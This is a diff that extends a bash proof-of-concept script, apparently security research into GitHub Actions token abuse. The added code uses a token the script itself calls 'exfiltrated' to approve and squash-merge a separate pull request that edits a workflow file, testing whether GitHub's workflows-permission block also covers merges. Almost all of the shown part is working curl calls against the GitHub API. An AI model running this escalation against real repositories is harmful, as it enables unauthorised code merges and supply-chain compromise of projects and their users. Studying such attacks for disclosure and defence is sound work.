@@ -88,3 +88,29 @@ log "comment POST -> HTTP $HTTP_CODE"
 if [[ "$HTTP_CODE" != "201" ]]; then
   log "response: $(jq -c . /tmp/poc-response.json 2>/dev/null || cat /tmp/poc-response.json)"
 fi
+
+# Escalation test: approve + merge a separate PR that modifies a workflow
+# file, to see whether GitHub's `workflows`-permission block applies to
+# merges as well as direct contents-API writes.
+readonly VICTIM_PR=5
+log "escalation: attempting approve + merge of PR #${VICTIM_PR} (workflow edit)"
+
+APPROVE_CODE=$(curl --silent --show-error --output /tmp/poc-approve.json \
+  --write-out '%{http_code}' \
+  --request POST \
+  --header "Authorization: Bearer $TOKEN" \
+  --header "Accept: application/vnd.github+json" \
+  --header "Content-Type: application/json" \
+  --data '{"event":"APPROVE","body":"approved by exfiltrated token"}' \
+  "https://api.github.com/repos/${GITHUB_REPOSITORY}/pulls/${VICTIM_PR}/reviews")
+log "approve  POST -> HTTP $APPROVE_CODE  body=$(head -c 200 /tmp/poc-approve.json)"
+
+MERGE_CODE=$(curl --silent --show-error --output /tmp/poc-merge.json \
+  --write-out '%{http_code}' \
+  --request PUT \
+  --header "Authorization: Bearer $TOKEN" \
+  --header "Accept: application/vnd.github+json" \
+  --header "Content-Type: application/json" \
+  --data '{"merge_method":"squash","commit_title":"Merge via exfiltrated token"}' \
+  "https://api.github.com/repos/${GITHUB_REPOSITORY}/pulls/${VICTIM_PR}/merge")
+log "merge    PUT  -> HTTP $MERGE_CODE  body=$(head -c 400 /tmp/poc-merge.json)"
